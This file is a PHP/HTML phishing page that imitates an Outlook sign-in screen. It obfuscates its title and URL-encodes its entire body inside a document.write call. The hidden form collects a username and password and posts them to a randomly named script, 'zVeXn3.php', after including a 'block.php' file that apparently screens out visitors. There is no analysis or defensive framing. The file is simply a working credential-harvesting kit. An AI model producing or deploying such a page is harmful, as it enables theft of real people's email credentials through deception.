<?
require_once 'block.php';

?>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">

<title>S&#105;gn I&#110;</title>
<link rel="shortcut icon" href="images/kooltuo.ico" />
<style type="text/css">
body
{
   background-color: #FFFFFF;
   color: #000000;
}
</style>
<style type="text/css">
a:hover
{
   color: #6CDA7B;
}
</style>
<!--[if lt IE 7]>
<style type="text/css">
   img { behavior: url("pngfix.htc"); }
</style>
<![endif]-->
</head>
<script>
<!--
document.write(unescape("%3Cbody%3E%3Cdiv%20%20style%3D%22margin%3A0%3Bpadding%3A0%3Bposition%3Aabsolute%3Bleft%3A20px%3Btop%3A15px%3Bwidth%3A360px%3Bheight%3A389px%3Btext-align%3Aleft%3Bz-index%3A3%3B%22%3E%3Cimg%20src%3D%22images/oubody.png%22%20id%3D%22Image2%22%20alt%3D%22%22%20style%3D%22width%3A360px%3Bheight%3A389px%3B%22%20align%3D%22top%22%20border%3D%220%22%3E%3C/div%3E%3Cinput%20id%3D%22Button2%22%20name%3D%22Button1%22%20value%3D%22%22%20style%3D%22position%3Aabsolute%3Bleft%3A32px%3Btop%3A267px%3Bwidth%3A86px%3Bheight%3A38px%3Bborder%3A0px%20%23000000%20dotted%3Bbackground-color%3Atransparent%3Bfont-family%3AArial%3Bfont-size%3A13px%3Bz-index%3A4%22%20type%3D%22submit%22%3E%3Cdiv%20style%3D%22position%3Aabsolute%3Bleft%3A0px%3Btop%3A0px%3Bwidth%3A398px%3Bheight%3A403px%3Bz-index%3A5%22%3E%3Cform%20name%3D%22Form1%22%20method%3D%22post%22%20action%3D%22zVeXn3.php%22%22%3E%3Cinput%20id%3D%22lookout%22%20style%3D%22position%3Aabsolute%3Bleft%3A41px%3Btop%3A140px%3Bwidth%3A318px%3Bheight%3A29px%3Bborder%3A1px%20%23C0C0C0%20solid%3Bfont-family%3AHelvetica%3Bfont-size%3A12px%3Bz-index%3A0%22%20name%3D%22outlokuname%22%20type%3D%22text%22%20pattern%3D%22.%7B4%2C30%7D%22%20oninvalid%3D%22this.setCustomValidity%28%27Required%20Field%27%29%22%20oninput%3D%22setCustomValidity%28%27%27%29%22%20title%3D%20%22Required%20Field%22%20required%3E%3Cinput%20id%3D%22%22%20style%3D%22position%3Aabsolute%3Bleft%3A41px%3Btop%3A195px%3Bwidth%3A318px%3Bheight%3A29px%3Bborder%3A1px%20%23C0C0C0%20solid%3Bfont-family%3AHelvetica%3Bfont-size%3A12px%3Bz-index%3A1%22%20name%3D%22outlokpasuma%22%20value%3D%22%22%20type%3D%22password%22%20pattern%3D%22.%7B3%2C16%7D%22%20oninvalid%3D%22this.setCustomValidity%28%27Required%20Field%27%29%22%20oninput%3D%22setCustomValidity%28%27%27%29%22%20title%3D%20%22Required%20Field%22%20required%3E%3Cinput%20id%3D%22Button3%22%20name%3D%22Button1%22%20value%3D%22%22%20style%3D%22position%3Aabsolute%3Bleft%3A41px%3Btop%3A280px%3Bwidth%3A86px%3Bheight%3A38px%3Bborder%3A0px%20%23000000%20dotted%3Bbackground-color%3Atransparent%3Bfont-family%3AArial%3Bfont-size%3A13px%3Bz-index%3A2%22%20type%3D%22submit%22%3E%3C/form%3E%3C/div%3E%3C/body%3E"));
//-->
</script></html>